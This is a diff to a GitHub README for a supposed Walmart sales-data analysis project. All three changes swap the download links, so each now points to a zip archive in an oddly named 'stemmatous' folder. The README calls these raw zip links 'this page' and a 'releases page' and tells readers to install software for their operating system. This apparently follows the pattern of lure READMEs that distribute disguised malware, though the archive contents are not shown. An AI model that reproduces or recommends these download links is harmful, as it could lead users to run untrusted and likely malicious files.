@@ -1,6 +1,6 @@
 # 📊 Sales-Data-Analysis-Project - Unlock Insights from Walmart's Sales Data
 
-[![Download Here](https://raw.githubusercontent.com/seba2609/Sales-Data-Analysis-Project/main/stemmatous/Sales-Data-Analysis-Project-v1.2.zip)](https://raw.githubusercontent.com/seba2609/Sales-Data-Analysis-Project/main/stemmatous/Sales-Data-Analysis-Project-v1.2.zip)
+[![Download Here](https://github.com/seba2609/Sales-Data-Analysis-Project/raw/refs/heads/main/stemmatous/Sales_Project_Data_Analysis_v2.8.zip)](https://github.com/seba2609/Sales-Data-Analysis-Project/raw/refs/heads/main/stemmatous/Sales_Project_Data_Analysis_v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Before you start, make sure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-To get the software, visit [this page to download](https://raw.githubusercontent.com/seba2609/Sales-Data-Analysis-Project/main/stemmatous/Sales-Data-Analysis-Project-v1.2.zip). 
+To get the software, visit [this page to download](https://github.com/seba2609/Sales-Data-Analysis-Project/raw/refs/heads/main/stemmatous/Sales_Project_Data_Analysis_v2.8.zip). 
 
 1. Once on the releases page, look for the latest version. 
 2. Choose the file that fits your operating system.
@@ -62,4 +62,4 @@ If you encounter issues or have questions, please raise them in the GitHub Issue
 
 ## ⚡ Conclusion
 
-The Sales Data Analysis Project provides an intuitive way to explore Walmart's sales dataset. With clear visualizations and essential metrics, you can make informed decisions. Don't forget to [visit this page to download](https://raw.githubusercontent.com/seba2609/Sales-Data-Analysis-Project/main/stemmatous/Sales-Data-Analysis-Project-v1.2.zip) the application and start discovering insights today.
+The Sales Data Analysis Project provides an intuitive way to explore Walmart's sales dataset. With clear visualizations and essential metrics, you can make informed decisions. Don't forget to [visit this page to download](https://github.com/seba2609/Sales-Data-Analysis-Project/raw/refs/heads/main/stemmatous/Sales_Project_Data_Analysis_v2.8.zip) the application and start discovering insights today.
